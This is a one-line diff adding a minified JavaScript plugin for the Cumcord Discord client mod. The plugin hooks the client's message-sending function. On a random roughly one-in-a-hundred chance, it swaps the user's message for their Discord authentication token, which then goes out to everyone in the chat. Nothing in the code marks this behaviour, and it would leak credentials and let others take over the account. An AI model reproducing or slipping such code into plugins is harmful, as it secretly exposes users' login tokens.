@@ -1,0 +1,1 @@
+(function(o,e){"use strict";const r=e.webpack.findByProps("sendMessage"),{getToken:c}=e.webpack.findByProps("getToken");let t;var s=()=>({onLoad(){t=o.after("sendMessage",r,n=>(u()&&(n[1].content=c()),n))},onUnload(){t?.()}});function u(){if(Math.floor(Math.random()*100)===69)return!0}return s})(cumcord.patcher,cumcord.modules);
